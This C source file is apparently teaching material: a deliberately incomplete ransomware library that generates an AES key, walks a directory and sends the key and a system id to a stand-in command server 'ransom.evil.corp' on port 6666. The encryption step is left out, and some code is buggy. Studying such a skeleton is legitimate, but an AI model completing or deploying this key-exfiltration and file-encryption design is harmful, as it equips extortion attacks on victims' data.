/**
 * Library for a ransomware trojan.
 *
 * This is for educational purposes only and does not
 * perform any dangerous operation.
 *
 * (c) 2021 Thomas Smits
 */
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include "util/aes.h"

#define CC_SERVER "ransom.evil.corp"
#define CC_PORT 6666

typedef struct system_id {
    char user[128];
    char ip[128];
} system_id;

/**
 * Generate a random key of AES_KEYLEN bytes.
 *
 * @param key (out) the generated key
 */
void generate_key(uint8_t* key) {
    int frandom;

    frandom = open("/dev/urandom", 0);
    if (frandom == -1) {
        exit(1);
    }

    read(frandom, key, AES_KEYLEN);
    close(frandom);
}

/**
 * Generate a system id for the system we are currently
 * infecting.
 *
 * @param id (out) the id generated
 */
void generate_system_id(system_id *id) {
    strcpy(id->user, "unknown");
    strcpy(id->ip, "127.0.0.1");
}

/**
 * Encrypt files with the given key.
 *
 * @param key (in) the key to be used
 * @param root (in) the directory the encryption should start at
 *
 */
void encrypt_files(const uint8_t* key, const char* root) {
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(root))) {
        exit(1);
    }

    char full_path[255];
    memset(full_path, 0, sizeof(full_path));

    while ((entry = readdir(dir))) {
        char *name = entry->d_name;
        strcat(full_path, root);
        strcat(full_path, name);
    }

    /*
      Here the real encryption would happen. As we are not
      writing real malware here, this part ist left out.
    */

    closedir(dir);
}

/**
 * Convert a hostname to an IP address.
 *
 * @param hostname (in) the hostname to be converted
 * @param ip (out) the result of the conversation
 * @return 0 on success, -1 on failure
 */
int hostname_to_ip(const char* hostname , char* ip)
{
	struct hostent *he;
	struct in_addr **addr_list;
	int i;

	if ((he = gethostbyname(hostname)) == NULL)
	{
		return -1;
	}

	addr_list = (struct in_addr **) he->h_addr_list;

	for(i = 0; addr_list[i] != NULL; i++)
	{
		/* Return the first one */
		strcpy(ip , inet_ntoa(*addr_list[i]) );
		return 0;
	}

	return -1;
}

/**
 * Send the encryption key home to our cc server.
 *
 * @param id (in) the system's id
 * @param key (in) the generated key
 * @return 0 on success, -1 on failure
 */
int send_home(const system_id *id, const uint8_t* key) {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char ip[100];

    if (hostname_to_ip(CC_SERVER, ip)) {
        return -1;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(CC_PORT);

    if(inet_pton(AF_INET, ip, &serv_addr.sin_addr)<=0) {
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        return -1;
    }

    send(sock, id, sizeof(system_id) , 0 );
    send(sock, key, sizeof(system_id) , 0 );

    return 0;
}
